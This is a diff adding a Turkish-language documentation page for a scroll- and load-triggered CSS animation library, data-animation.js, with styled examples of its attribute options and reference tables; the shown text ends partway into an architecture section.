@@ -1,0 +1,897 @@
+<!doctype html>
+<html lang="tr">
+   <head>
+      <meta charset="UTF-8" />
+      <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+      <link rel="shortcut icon" href="favicon.png" type="image/x-icon" />
+      <title>Data Animation — Dokümantasyon</title>
+      <style>
+         :root {
+            --bg: #0f1117;
+            --surface: #1a1d27;
+            --surface-2: #232734;
+            --border: #2e3348;
+            --text: #e2e4ed;
+            --text-muted: #8b8fa7;
+            --accent: #6c8aff;
+            --accent-hover: #8da5ff;
+            --green: #4ade80;
+            --orange: #fb923c;
+            --red: #f87171;
+            --code-bg: #141620;
+            --radius: 10px;
+         }
+
+         * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+         }
+
+         body {
+            font-family:
+               'Segoe UI',
+               system-ui,
+               -apple-system,
+               sans-serif;
+            background: var(--bg);
+            color: var(--text);
+            line-height: 1.65;
+            padding: 0;
+         }
+
+         /* ── Layout ── */
+         .wrapper {
+            max-width: 960px;
+            margin: 0 auto;
+            padding: 3rem 1.5rem 6rem;
+         }
+
+         /* ── Hero ── */
+         .hero {
+            text-align: center;
+            margin-bottom: 4rem;
+            padding: 3rem 1rem;
+            border-bottom: 1px solid var(--border);
+         }
+
+         .hero h1 {
+            font-size: 2.6rem;
+            font-weight: 700;
+            letter-spacing: -0.03em;
+            margin-bottom: 0.5rem;
+         }
+
+         .hero h1 span {
+            color: var(--accent);
+         }
+
+         .hero p {
+            color: var(--text-muted);
+            font-size: 1.15rem;
+            max-width: 600px;
+            margin: 0 auto;
+         }
+
+         /* ── TOC ── */
+         .toc {
+            background: var(--surface);
+            border: 1px solid var(--border);
+            border-radius: var(--radius);
+            padding: 1.5rem 2rem;
+            margin-bottom: 3rem;
+         }
+
+         .toc h2 {
+            font-size: 1rem;
+            text-transform: uppercase;
+            letter-spacing: 0.08em;
+            color: var(--text-muted);
+            margin-bottom: 1rem;
+         }
+
+         .toc ul {
+            list-style: none;
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(220px, 1fr));
+            gap: 0.4rem 2rem;
+         }
+
+         .toc a {
+            color: var(--accent);
+            text-decoration: none;
+            font-size: 0.95rem;
+            transition: color 0.2s;
+         }
+
+         .toc a:hover {
+            color: var(--accent-hover);
+            text-decoration: underline;
+         }
+
+         /* ── Section ── */
+         .section {
+            margin-bottom: 3.5rem;
+         }
+
+         .section-header {
+            display: flex;
+            align-items: center;
+            gap: 0.75rem;
+            margin-bottom: 0.5rem;
+         }
+
+         .section-header h2 {
+            font-size: 1.5rem;
+            font-weight: 600;
+         }
+
+         .badge {
+            display: inline-block;
+            font-size: 0.7rem;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 0.06em;
+            padding: 0.2rem 0.6rem;
+            border-radius: 999px;
+            background: var(--accent);
+            color: var(--bg);
+         }
+
+         .section > p {
+            color: var(--text-muted);
+            margin-bottom: 1.25rem;
+            max-width: 700px;
+         }
+
+         /* ── Syntax ── */
+         .syntax {
+            background: var(--code-bg);
+            border: 1px solid var(--border);
+            border-radius: var(--radius);
+            padding: 0.5rem 1rem;
+            margin-bottom: 1.25rem;
+            font-family: 'Cascadia Code', 'Fira Code', 'Consolas', monospace;
+            font-size: 0.88rem;
+            color: var(--orange);
+            overflow-x: auto;
+         }
+
+         /* ── Demo Card ── */
+         .demo-card {
+            background: var(--surface);
+            border: 1px solid var(--border);
+            border-radius: var(--radius);
+            overflow: hidden;
+            margin-bottom: 1rem;
+         }
+
+         .demo-area {
+            padding: 2rem;
+            display: flex;
+            flex-wrap: wrap;
+            align-items: center;
+            gap: 1rem;
+            min-height: 80px;
+            position: relative;
+         }
+
+         .demo-area.column {
+            flex-direction: column;
+            align-items: flex-start;
+         }
+
+         .code-block {
+            background: var(--code-bg);
+            border-top: 1px solid var(--border);
+            padding: 1rem 1.25rem;
+            overflow-x: auto;
+            position: relative;
+         }
+
+         .code-block pre {
+            font-family: 'Cascadia Code', 'Fira Code', 'Consolas', monospace;
+            font-size: 0.82rem;
+            line-height: 1.7;
+            color: var(--text-muted);
+            white-space: pre;
+            margin: 0;
+         }
+
+         .code-block .tag {
+            color: var(--red);
+         }
+
+         .code-block .attr {
+            color: var(--orange);
+         }
+
+         .code-block .str {
+            color: var(--green);
+         }
+
+         .code-block .cmt {
+            color: #555b78;
+            font-style: italic;
+         }
+
+         .code-label {
+            display: inline-block;
+            font-size: 0.7rem;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 0.06em;
+            color: var(--text-muted);
+            margin-bottom: 0.5rem;
+         }
+
+         /* ── Demo Animation Boxes ── */
+         .anim-box {
+            padding: 1.5rem 2rem;
+            border-radius: 8px;
+            background: var(--surface-2);
+            border: 1px dashed var(--border);
+            color: var(--text-muted);
+            font-size: 0.9rem;
+            width: 100%;
+            text-align: center;
+            opacity: 0;
+            transform: translateY(30px);
+            transition:
+               opacity 0.6s ease,
+               transform 0.6s ease;
+         }
+
+         .anim-box.animate {
+            opacity: 1;
+            transform: translateY(0);
+         }
+
+         .anim-box-fade {
+            padding: 1.5rem 2rem;
+            border-radius: 8px;
+            background: var(--surface-2);
+            border: 1px dashed var(--border);
+            color: var(--text-muted);
+            font-size: 0.9rem;
+            width: 100%;
+            text-align: center;
+            opacity: 0;
+            transition: opacity 0.8s ease;
+         }
+
+         .anim-box-fade.animate {
+            opacity: 1;
+         }
+
+         .anim-box-slide {
+            padding: 1.5rem 2rem;
+            border-radius: 8px;
+            background: var(--surface-2);
+            border: 1px dashed var(--border);
+            color: var(--text-muted);
+            font-size: 0.9rem;
+            width: 100%;
+            text-align: center;
+            opacity: 0;
+            transform: translateX(-40px);
+            transition:
+               opacity 0.6s ease,
+               transform 0.6s ease;
+         }
+
+         .anim-box-slide.animate {
+            opacity: 1;
+            transform: translateX(0);
+         }
+
+         .anim-box-scale {
+            padding: 1.5rem 2rem;
+            border-radius: 8px;
+            background: var(--surface-2);
+            border: 1px dashed var(--border);
+            color: var(--text-muted);
+            font-size: 0.9rem;
+            width: 100%;
+            text-align: center;
+            opacity: 0;
+            transform: scale(0.85);
+            transition:
+               opacity 0.5s ease,
+               transform 0.5s ease;
+         }
+
+         .anim-box-scale.animate {
+            opacity: 1;
+            transform: scale(1);
+         }
+
+         /* Media Badge */
+         .media-indicator {
+            display: inline-block;
+            padding: 0.3rem 0.8rem;
+            border-radius: 6px;
+            font-size: 0.8rem;
+            background: var(--surface-2);
+            border: 1px solid var(--border);
+            color: var(--text-muted);
+         }
+
+         /* ── Notes ── */
+         .note {
+            background: #1a1d27;
+            border-left: 3px solid var(--accent);
+            padding: 0.8rem 1rem;
+            border-radius: 0 var(--radius) var(--radius) 0;
+            margin-top: 1rem;
+            font-size: 0.85rem;
+            color: var(--text-muted);
+         }
+
+         .note strong {
+            color: var(--text);
+         }
+
+         /* ── Responsive ── */
+         @media (max-width: 640px) {
+            .hero h1 {
+               font-size: 1.8rem;
+            }
+
+            .wrapper {
+               padding: 2rem 1rem 4rem;
+            }
+
+            .toc ul {
+               grid-template-columns: 1fr;
+            }
+         }
+
+         /* ── Footer ── */
+         .footer {
+            text-align: center;
+            padding: 2rem 0;
+            border-top: 1px solid var(--border);
+            margin-top: 2rem;
+            color: var(--text-muted);
+            font-size: 0.82rem;
+         }
+      </style>
+   </head>
+
+   <body>
+      <div class="wrapper">
+         <!-- ════════════ HERO ════════════ -->
+         <header class="hero">
+            <h1><span>data-animation</span>.js</h1>
+            <p>Scroll ve load tabanlı animasyon yöneticisi. <code>data-animation</code> attribute ile elemanları görünür olduğunda <code>.animate</code> class'ı ekler — CSS transition'larınızla birlikte çalışır.</p>
+         </header>
+
+         <!-- ════════════ TOC ════════════ -->
+         <nav class="toc">
+            <h2>İçindekiler</h2>
+            <ul>
+               <li><a href="#on-load">on:load — Sayfa Yüklemede</a></li>
+               <li><a href="#on-scroll">on:scroll — Scroll Tetikleyici</a></li>
+               <li><a href="#threshold">threshold — Görünürlük Eşiği</a></li>
+               <li><a href="#reset">reset:on-leave — Tekrar Gizle</a></li>
+               <li><a href="#media">media — Media Query Koşulu</a></li>
+               <li><a href="#css-only">CSS-Only Kullanım</a></li>
+               <li><a href="#combined">Birleşik Örnekler</a></li>
+               <li><a href="#params">Parametre Referans Tablosu</a></li>
+               <li><a href="#architecture">Mimari ve Teknik Detaylar</a></li>
+            </ul>
+         </nav>
+
+         <!-- ═══════════════════════════════════════════════
+           1. ON:LOAD
+      ═══════════════════════════════════════════════ -->
+         <section id="on-load" class="section">
+            <div class="section-header">
+               <h2>on:load</h2>
+               <span class="badge">Temel</span>
+            </div>
+            <p>Sayfa yüklendiğinde (window load event) <code>.animate</code> class'ını ekler. Hero bölümleri ve ilk ekranda görünecek elemanlar için idealdir.</p>
+
+            <div class="syntax"><code>data-animation="on:load"</code></div>
+
+            <div class="demo-card">
+               <div class="demo-area column">
+                  <div class="anim-box-fade" data-animation="on:load"> 🚀 Bu kutu sayfa yüklendiğinde fade-in ile belirir </div>
+               </div>
+               <div class="code-block">
+                  <span class="code-label">HTML</span>
+                  <pre><span class="tag">&lt;div</span> <span class="attr">data-animation</span>=<span class="str">"on:load"</span><span class="tag">&gt;</span>
+   Sayfa yüklendiğinde animasyon
+<span class="tag">&lt;/div&gt;</span></pre>
+               </div>
+            </div>
+
+            <div class="note"> <strong>Zamanlama:</strong> <code>on:load</code>, <code>window</code> load event'ine bağlıdır — tüm kaynaklar (resimler, fontlar) yüklendikten sonra çalışır. Hero alanı veya above-the-fold içerik için kullanın. </div>
+         </section>
+
+         <!-- ═══════════════════════════════════════════════
+           2. ON:SCROLL
+      ═══════════════════════════════════════════════ -->
+         <section id="on-scroll" class="section">
+            <div class="section-header">
+               <h2>on:scroll</h2>
+               <span class="badge">Temel</span>
+            </div>
+            <p>Eleman viewport'a girdiğinde <code>.animate</code> class'ını ekler. IntersectionObserver kullanır — performans dostudur.</p>
+
+            <div class="syntax"><code>data-animation="on:scroll"</code></div>
+
+            <div class="demo-card">
+               <div class="demo-area column">
+                  <div class="anim-box" data-animation="on:scroll"> ✨ Bu kutu scroll ile görünür olduğunda animasyonla belirir </div>
+               </div>
+               <div class="code-block">
+                  <span class="code-label">HTML</span>
+                  <pre><span class="tag">&lt;div</span> <span class="attr">data-animation</span>=<span class="str">"on:scroll"</span><span class="tag">&gt;</span>
+   Scroll ile animasyon
+<span class="tag">&lt;/div&gt;</span></pre>
+               </div>
+            </div>
+
+            <div class="note"> <strong>Nasıl çalışır?</strong> <code>on:scroll</code> parametresi IntersectionObserver ile elemanı izler. Eleman viewport'a girdiğinde <code>.animate</code> class'ı eklenir. CSS ile istediğiniz geçiş efektini tanımlayabilirsiniz. </div>
+         </section>
+
+         <!-- ═══════════════════════════════════════════════
+           3. THRESHOLD
+      ═══════════════════════════════════════════════ -->
+         <section id="threshold" class="section">
+            <div class="section-header">
+               <h2>threshold</h2>
+               <span class="badge">Ayar</span>
+            </div>
+            <p>Elemanın ne kadarının görünür olması gerektiğini belirler. 0–1 arasında değer alır (0.5 = %50 görünür olunca tetiklenir). Varsayılan: <code>0.01</code>.</p>
+
+            <div class="syntax"><code>data-animation="on:scroll, threshold:0.3"</code></div>
+
+            <div class="demo-card">
+               <div class="demo-area column" style="gap: 1.5rem">
+                  <div class="anim-box" data-animation="on:scroll, threshold:0.01" style="transition-delay: 0s"> <strong>threshold:0.01</strong> — Çok az göründüğünde tetiklenir (varsayılan) </div>
+                  <div class="anim-box" data-animation="on:scroll, threshold:0.3" style="transition-delay: 0.15s"> <strong>threshold:0.3</strong> — %30 göründüğünde tetiklenir </div>
+                  <div class="anim-box" data-animation="on:scroll, threshold:0.6" style="transition-delay: 0.3s"> <strong>threshold:0.6</strong> — %60 göründüğünde tetiklenir </div>
+               </div>
+               <div class="code-block">
+                  <span class="code-label">HTML</span>
+                  <pre><span class="cmt">&lt;!-- Varsayılan — neredeyse hemen tetiklenir --&gt;</span>
+<span class="tag">&lt;div</span> <span class="attr">data-animation</span>=<span class="str">"on:scroll"</span><span class="tag">&gt;</span>...<span class="tag">&lt;/div&gt;</span>
+
+<span class="cmt">&lt;!-- %30 göründüğünde --&gt;</span>
+<span class="tag">&lt;div</span> <span class="attr">data-animation</span>=<span class="str">"on:scroll, threshold:0.3"</span><span class="tag">&gt;</span>...<span class="tag">&lt;/div&gt;</span>
+
+<span class="cmt">&lt;!-- %60 göründüğünde --&gt;</span>
+<span class="tag">&lt;div</span> <span class="attr">data-animation</span>=<span class="str">"on:scroll, threshold:0.6"</span><span class="tag">&gt;</span>...<span class="tag">&lt;/div&gt;</span></pre>
+               </div>
+            </div>
+
+            <div class="note"> <strong>Gruplama:</strong> Aynı threshold değerine sahip elemanlar tek bir IntersectionObserver altında gruplanır. Farklı threshold değerleri ayrı observer'lar oluşturur — performans için minimum farklı threshold kullanın. </div>
+         </section>
+
+         <!-- ═══════════════════════════════════════════════
+           4. RESET
+      ═══════════════════════════════════════════════ -->
+         <section id="reset" class="section">
+            <div class="section-header">
+               <h2>reset:on-leave</h2>
+               <span class="badge">Davranış</span>
+            </div>
+            <p>Eleman viewport'tan çıktığında <code>.animate</code> class'ını kaldırır. Tekrar scroll edildiğinde animasyon yeniden çalışır — tekrarlayan efektler için kullanılır.</p>
+
+            <div class="syntax"><code>data-animation="on:scroll, reset:on-leave"</code></div>
+
+            <div class="demo-card">
+               <div class="demo-area column" style="gap: 1.5rem">
+                  <div class="anim-box" data-animation="on:scroll, reset:on-leave"> 🔄 Reset aktif — Viewport'tan çıkınca gizlenir, tekrar girince animasyon oynar </div>
+                  <div class="anim-box" data-animation="on:scroll"> 🔒 Reset yok — Bir kez animasyon oynar, sonra kalır </div>
+               </div>
+               <div class="code-block">
+                  <span class="code-label">HTML</span>
+                  <pre><span class="cmt">&lt;!-- Her scroll'da tekrar animasyon --&gt;</span>
+<span class="tag">&lt;div</span> <span class="attr">data-animation</span>=<span class="str">"on:scroll, reset:on-leave"</span><span class="tag">&gt;</span>
+   Tekrarlayan animasyon
+<span class="tag">&lt;/div&gt;</span>
+
+<span class="cmt">&lt;!-- Yalnızca bir kez animasyon --&gt;</span>
+<span class="tag">&lt;div</span> <span class="attr">data-animation</span>=<span class="str">"on:scroll"</span><span class="tag">&gt;</span>
+   Tek seferlik animasyon
+<span class="tag">&lt;/div&gt;</span></pre>
+               </div>
+            </div>
+
+            <div class="note"> <strong>Performans:</strong> <code>reset:on-leave</code> IntersectionObserver'ı sürekli aktif tutar. Reset olmadan, eleman bir kez animate edildikten sonra observer devam eder ancak tekrar class eklemesi yapmaz. </div>
+         </section>
+
+         <!-- ═══════════════════════════════════════════════
+           5. MEDIA
+      ═══════════════════════════════════════════════ -->
+         <section id="media" class="section">
+            <div class="section-header">
+               <h2>media:(&lt;query&gt;)</h2>
+               <span class="badge">Koşullu</span>
+            </div>
+            <p>Animasyonu bir media query koşuluna bağlar. Koşul eşleşmezse animasyon atlanır; koşul sonradan eşleşirse dinamik olarak devreye girer. Responsive animasyonlar için idealdir.</p>
+
+            <div class="syntax"><code>data-animation="on:scroll, media:(width &lt; 1024px)"</code></div>
+
+            <div class="demo-card">
+               <div class="demo-area column">
+                  <div class="anim-box-scale" data-animation="on:scroll, media:(width < 1024px)"> 📱 Sadece &lt;1024px altında animasyon çalışır </div>
+                  <div class="anim-box-scale" data-animation="on:scroll, media:(width >= 1024px)"> 🖥️ Sadece ≥1024px üzerinde animasyon çalışır </div>
+                  <span class="media-indicator"> Pencere genişliği: <span id="window-width"></span>px </span>
+               </div>
+               <div class="code-block">
+                  <span class="code-label">HTML</span>
+                  <pre><span class="cmt">&lt;!-- Sadece mobilde animasyon --&gt;</span>
+<span class="tag">&lt;div</span> <span class="attr">data-animation</span>=<span class="str">"on:scroll, media:(width &lt; 1024px)"</span><span class="tag">&gt;</span>
+   Mobil animasyon
+<span class="tag">&lt;/div&gt;</span>
+
+<span class="cmt">&lt;!-- Sadece desktop'ta animasyon --&gt;</span>
+<span class="tag">&lt;div</span> <span class="attr">data-animation</span>=<span class="str">"on:scroll, media:(width &gt;= 1024px)"</span><span class="tag">&gt;</span>
+   Desktop animasyon
+<span class="tag">&lt;/div&gt;</span></pre>
+               </div>
+            </div>
+
+            <div class="note"> <strong>Dinamik davranış:</strong> Media query eşleştiğinde animasyon aktifleşir, eşleşmezse <code>.animate</code> class'ı kaldırılır. Pencere boyutu değiştikçe anlık tepki verir (matchMedia change event). </div>
+            <div class="note" style="margin-top: 0.5rem"> <strong>Desteklenen format:</strong> <code>width &lt; 1024px</code>, <code>height &gt;= 600px</code>, <code>width = 768px</code> gibi kısaltılmış ifadeler. Script bunları otomatik olarak geçerli CSS media query'ye dönüştürür. </div>
+         </section>
+
+         <!-- ═══════════════════════════════════════════════
+           6. CSS-ONLY
+      ═══════════════════════════════════════════════ -->
+         <section id="css-only" class="section">
+            <div class="section-header">
+               <h2>CSS-Only Kullanım</h2>
+               <span class="badge">Bilgi</span>
+            </div>
+            <p><code>on</code> parametresi olmadan kullanılan <code>data-animation</code> değerleri JavaScript tarafından sessizce atlanır. Bu değerler yalnızca CSS selector'lar için kullanılabilir — JS herhangi bir işlem yapmaz.</p>
+
+            <div class="demo-card">
+               <div class="code-block" style="border-top: none">
+                  <span class="code-label">HTML</span>
+                  <pre><span class="cmt">&lt;!-- JS tarafından atlanır — sadece CSS ile kullanılabilir --&gt;</span>
+<span class="tag">&lt;div</span> <span class="attr">data-animation</span>=<span class="str">"reveal"</span><span class="tag">&gt;</span>CSS-only reveal<span class="tag">&lt;/div&gt;</span>
+<span class="tag">&lt;div</span> <span class="attr">data-animation</span>=<span class="str">"slide-up"</span><span class="tag">&gt;</span>CSS-only slide<span class="tag">&lt;/div&gt;</span></pre>
+               </div>
+            </div>
+
+            <div class="demo-card" style="margin-top: 0.5rem">
+               <div class="code-block" style="border-top: none">
+                  <span class="code-label">CSS Örneği</span>
+                  <pre><span class="cmt">/* CSS animation — JS müdahalesi olmadan */</span>
+<span class="tag">[data-animation="reveal"]</span> {
+   <span class="attr">animation</span>: <span class="str">fadeIn 0.6s ease forwards</span>;
+}
+
+<span class="tag">[data-animation="slide-up"]</span> {
+   <span class="attr">animation</span>: <span class="str">slideUp 0.5s ease forwards</span>;
+}</pre>
+               </div>
+            </div>
+
+            <div class="note"> <strong>Uyarı:</strong> <code>threshold</code> veya <code>reset</code> gibi mantıksal parametreler <code>on</code> olmadan kullanılırsa console'a uyarı yazılır. Ancak JS hiçbir class ekleme/kaldırma işlemi yapmaz. </div>
+         </section>
+
+         <!-- ═══════════════════════════════════════════════
+           7. COMBINED EXAMPLES
+      ═══════════════════════════════════════════════ -->
+         <section id="combined" class="section">
+            <div class="section-header">
+               <h2>Birleşik Örnekler</h2>
+               <span class="badge">Pratik</span>
+            </div>
+            <p>Parametreler virgülle birleştirilerek güçlü animasyon davranışları oluşturulabilir. İşte gerçek dünyadan örnekler:</p>
+
+            <!-- Example A: Staggered Cards -->
+            <h3 style="margin: 1.5rem 0 0.75rem; font-size: 1.1rem">🎴 Sıralı Kart Animasyonu</h3>
+            <div class="demo-card">
+               <div class="demo-area column">
+                  <div style="display: grid; grid-template-columns: repeat(3, 1fr); gap: 1rem; width: 100%">
+                     <div class="anim-box" data-animation="on:scroll, threshold:0.3" style="transition-delay: 0s">Kart 1</div>
+                     <div class="anim-box" data-animation="on:scroll, threshold:0.3" style="transition-delay: 0.15s">Kart 2</div>
+                     <div class="anim-box" data-animation="on:scroll, threshold:0.3" style="transition-delay: 0.3s">Kart 3</div>
+                  </div>
+               </div>
+               <div class="code-block">
+                  <span class="code-label">HTML</span>
+                  <pre><span class="cmt">&lt;!-- CSS transition-delay ile sıralı animasyon --&gt;</span>
+<span class="tag">&lt;div</span> <span class="attr">data-animation</span>=<span class="str">"on:scroll, threshold:0.3"</span>
+     <span class="attr">style</span>=<span class="str">"transition-delay: 0s"</span><span class="tag">&gt;</span>Kart 1<span class="tag">&lt;/div&gt;</span>
+<span class="tag">&lt;div</span> <span class="attr">data-animation</span>=<span class="str">"on:scroll, threshold:0.3"</span>
+     <span class="attr">style</span>=<span class="str">"transition-delay: 0.15s"</span><span class="tag">&gt;</span>Kart 2<span class="tag">&lt;/div&gt;</span>
+<span class="tag">&lt;div</span> <span class="attr">data-animation</span>=<span class="str">"on:scroll, threshold:0.3"</span>
+     <span class="attr">style</span>=<span class="str">"transition-delay: 0.3s"</span><span class="tag">&gt;</span>Kart 3<span class="tag">&lt;/div&gt;</span></pre>
+               </div>
+            </div>
+
+            <!-- Example B: Scroll Reset + Threshold -->
+            <h3 style="margin: 1.5rem 0 0.75rem; font-size: 1.1rem">🔄 Tekrarlayan Scroll Animasyonu</h3>
+            <div class="demo-card">
+               <div class="demo-area column">
+                  <div class="anim-box-slide" data-animation="on:scroll, threshold:0.5, reset:on-leave"> %50 göründüğünde kayarak gelir, viewport'tan çıkınca kayarak gider </div>
+               </div>
+               <div class="code-block">
+                  <span class="code-label">HTML</span>
+                  <pre><span class="cmt">&lt;!-- threshold + reset birlikte --&gt;</span>
+<span class="tag">&lt;div</span> <span class="attr">data-animation</span>=<span class="str">"on:scroll, threshold:0.5, reset:on-leave"</span><span class="tag">&gt;</span>
+   Tekrarlayan slide animasyonu
+<span class="tag">&lt;/div&gt;</span></pre>
+               </div>
+            </div>
+
+            <!-- Example C: Load + Media -->
+            <h3 style="margin: 1.5rem 0 0.75rem; font-size: 1.1rem">📱 Responsive Load Animasyonu</h3>
+            <div class="demo-card">
+               <div class="code-block" style="border-top: none">
+                  <span class="code-label">HTML</span>
+                  <pre><span class="cmt">&lt;!-- Sadece mobilde load animasyonu --&gt;</span>
+<span class="tag">&lt;div</span> <span class="attr">data-animation</span>=<span class="str">"on:load, media:(width &lt; 768px)"</span><span class="tag">&gt;</span>
+   Mobil hero animasyonu
+<span class="tag">&lt;/div&gt;</span>
+
+<span class="cmt">&lt;!-- Desktop'ta scroll, mobilde sadece CSS --&gt;</span>
+<span class="tag">&lt;div</span> <span class="attr">data-animation</span>=<span class="str">"on:scroll, threshold:0.2, media:(width &gt;= 1024px)"</span><span class="tag">&gt;</span>
+   Desktop-only scroll animasyonu
+<span class="tag">&lt;/div&gt;</span></pre>
+               </div>
+            </div>
+
+            <!-- Example D: Full combo -->
+            <h3 style="margin: 1.5rem 0 0.75rem; font-size: 1.1rem">✨ Tam Combo</h3>
+            <div class="demo-card">
+               <div class="demo-area column">
+                  <div class="anim-box-scale" data-animation="on:scroll, threshold:0.4, reset:on-leave"> 🎯 threshold:0.4 + reset:on-leave — Scale efekti ile tekrarlayan animasyon </div>
+               </div>
+               <div class="code-block">
+                  <span class="code-label">HTML</span>
+                  <pre><span class="cmt">&lt;!-- Tüm parametreler birlikte --&gt;</span>
+<span class="tag">&lt;div</span> <span class="attr">data-animation</span>=<span class="str">"on:scroll, threshold:0.4, reset:on-leave, media:(width &gt;= 768px)"</span><span class="tag">&gt;</span>
+   Desktop'ta, %40 göründüğünde, tekrarlayan animasyon
+<span class="tag">&lt;/div&gt;</span></pre>
+               </div>
+            </div>
+
+            <div class="note"> <strong>CSS Transition-Delay:</strong> Script sadece <code>.animate</code> class'ını ekler/kaldırır. Sıralı (stagger) animasyonlar için CSS <code>transition-delay</code> kullanın — JS tarafında ek yapılandırma gerekmez. </div>
+         </section>
+
+         <!-- ═══════════════════════════════════════════════
+           8. PARAM TABLE
+      ═══════════════════════════════════════════════ -->
+         <section id="params" class="section">
+            <div class="section-header">
+               <h2>Parametre Referans Tablosu</h2>
+            </div>
+
+            <h3 style="margin: 1rem 0 0.75rem; font-size: 1.1rem">data-animation Parametreleri</h3>
+            <div class="demo-card">
+               <div style="overflow-x: auto">
+                  <table style="width: 100%; border-collapse: collapse; font-size: 0.85rem; table-layout: fixed; min-width: 640px">
+                     <thead>
+                        <tr style="border-bottom: 1px solid var(--border); text-align: left">
+                           <th style="padding: 0.75rem 1rem; color: var(--text-muted); font-weight: 600; width: 17%">Parametre</th>
+                           <th style="padding: 0.75rem 1rem; color: var(--text-muted); font-weight: 600; width: 28%">Sözdizimi</th>
+                           <th style="padding: 0.75rem 1rem; color: var(--text-muted); font-weight: 600; width: 40%">Açıklama</th>
+                           <th style="padding: 0.75rem 1rem; color: var(--text-muted); font-weight: 600; width: 15%">Varsayılan</th>
+                        </tr>
+                     </thead>
+                     <tbody>
+                        <tr style="border-bottom: 1px solid var(--border)">
+                           <td style="padding: 0.75rem 1rem; color: var(--accent)">on</td>
+                           <td style="padding: 0.75rem 1rem"><code>on:scroll</code> | <code>on:load</code></td>
+                           <td style="padding: 0.75rem 1rem; color: var(--text-muted)">Animasyon tetikleme yöntemi. <code>scroll</code> = görünürlükte, <code>load</code> = sayfa yüklendiğinde</td>
+                           <td style="padding: 0.75rem 1rem; color: var(--text-muted)">—</td>
+                        </tr>
+                        <tr style="border-bottom: 1px solid var(--border)">
+                           <td style="padding: 0.75rem 1rem; color: var(--accent)">threshold</td>
+                           <td style="padding: 0.75rem 1rem"><code>threshold:&lt;0–1&gt;</code></td>
+                           <td style="padding: 0.75rem 1rem; color: var(--text-muted)">IntersectionObserver eşik değeri. 0.5 = %50 görünür olunca tetiklenir</td>
+                           <td style="padding: 0.75rem 1rem; color: var(--text-muted)">0.01</td>
+                        </tr>
+                        <tr style="border-bottom: 1px solid var(--border)">
+                           <td style="padding: 0.75rem 1rem; color: var(--accent)">reset</td>
+                           <td style="padding: 0.75rem 1rem"><code>reset:on-leave</code></td>
+                           <td style="padding: 0.75rem 1rem; color: var(--text-muted)">Eleman viewport'tan çıktığında <code>.animate</code> class'ını kaldırır</td>
+                           <td style="padding: 0.75rem 1rem; color: var(--text-muted)">—</td>
+                        </tr>
+                        <tr>
+                           <td style="padding: 0.75rem 1rem; color: var(--accent)">media</td>
+                           <td style="padding: 0.75rem 1rem"><code>media:(&lt;expression&gt;)</code></td>
+                           <td style="padding: 0.75rem 1rem; color: var(--text-muted)">Animasyonu media query koşuluna bağlar. Eşleşmezse animasyon çalışmaz</td>
+                           <td style="padding: 0.75rem 1rem; color: var(--text-muted)">—</td>
+                        </tr>
+                     </tbody>
+                  </table>
+               </div>
+            </div>
+
+            <h3 style="margin: 1.5rem 0 0.75rem; font-size: 1.1rem">Media Query Formatı</h3>
+            <div class="demo-card">
+               <div style="overflow-x: auto">
+                  <table style="width: 100%; border-collapse: collapse; font-size: 0.85rem; table-layout: fixed; min-width: 640px">
+                     <thead>
+                        <tr style="border-bottom: 1px solid var(--border); text-align: left">
+                           <th style="padding: 0.75rem 1rem; color: var(--text-muted); font-weight: 600; width: 35%">Input</th>
+                           <th style="padding: 0.75rem 1rem; color: var(--text-muted); font-weight: 600; width: 35%">Dönüştürülen CSS</th>
+                           <th style="padding: 0.75rem 1rem; color: var(--text-muted); font-weight: 600; width: 30%">Açıklama</th>
+                        </tr>
+                     </thead>
+                     <tbody>
+                        <tr style="border-bottom: 1px solid var(--border)">
+                           <td style="padding: 0.75rem 1rem; color: var(--accent)"><code>width &lt; 1024px</code></td>
+                           <td style="padding: 0.75rem 1rem"><code>(width &lt; 1024px)</code></td>
+                           <td style="padding: 0.75rem 1rem; color: var(--text-muted)">1024px'den dar ekranlar</td>
+                        </tr>
+                        <tr style="border-bottom: 1px solid var(--border)">
+                           <td style="padding: 0.75rem 1rem; color: var(--accent)"><code>width &gt;= 768px</code></td>
+                           <td style="padding: 0.75rem 1rem"><code>(width &gt;= 768px)</code></td>
+                           <td style="padding: 0.75rem 1rem; color: var(--text-muted)">768px ve üstü ekranlar</td>
+                        </tr>
+                        <tr style="border-bottom: 1px solid var(--border)">
+                           <td style="padding: 0.75rem 1rem; color: var(--accent)"><code>height &gt; 600px</code></td>
+                           <td style="padding: 0.75rem 1rem"><code>(height &gt; 600px)</code></td>
+                           <td style="padding: 0.75rem 1rem; color: var(--text-muted)">600px'den yüksek ekranlar</td>
+                        </tr>
+                        <tr>
+                           <td style="padding: 0.75rem 1rem; color: var(--accent)"><code>width = 768px</code></td>
+                           <td style="padding: 0.75rem 1rem"><code>(width: 768px)</code></td>
+                           <td style="padding: 0.75rem 1rem; color: var(--text-muted)">Tam 768px genişlik</td>
+                        </tr>
+                     </tbody>
+                  </table>
+               </div>
+            </div>
+
+            <h3 style="margin: 1.5rem 0 0.75rem; font-size: 1.1rem">Eklenen Class</h3>
+            <div class="demo-card">
+               <div style="overflow-x: auto">
+                  <table style="width: 100%; border-collapse: collapse; font-size: 0.85rem; table-layout: fixed; min-width: 640px">
+                     <thead>
+                        <tr style="border-bottom: 1px solid var(--border); text-align: left">
+                           <th style="padding: 0.75rem 1rem; color: var(--text-muted); font-weight: 600; width: 25%">Class</th>
+                           <th style="padding: 0.75rem 1rem; color: var(--text-muted); font-weight: 600; width: 30%">Ne zaman eklenir</th>
+                           <th style="padding: 0.75rem 1rem; color: var(--text-muted); font-weight: 600; width: 45%">Açıklama</th>
+                        </tr>
+                     </thead>
+                     <tbody>
+                        <tr>
+                           <td style="padding: 0.75rem 1rem; color: var(--accent)"><code>.animate</code></td>
+                           <td style="padding: 0.75rem 1rem">scroll / load tetiklendiğinde</td>
+                           <td style="padding: 0.75rem 1rem; color: var(--text-muted)">Hedef elemana eklenen tek class. CSS transition/animation ile eşleştirin</td>
+                        </tr>
+                     </tbody>
+                  </table>
+               </div>
+            </div>
+         </section>
+
+         <!-- ════════════ ARCHITECTURE ════════════ -->
+         <section id="architecture" class="section">
+            <div class="section-header">
+               <h2>Mimari ve Teknik Detaylar</h2>
+            </div>
+
+            <div class="demo-card">
+               <div class="code-block" style="border-top: none">
+                  <span class="code-label">Çalışma Akışı</span>
+                  <pre style="color: var(--text); line-height: 2">
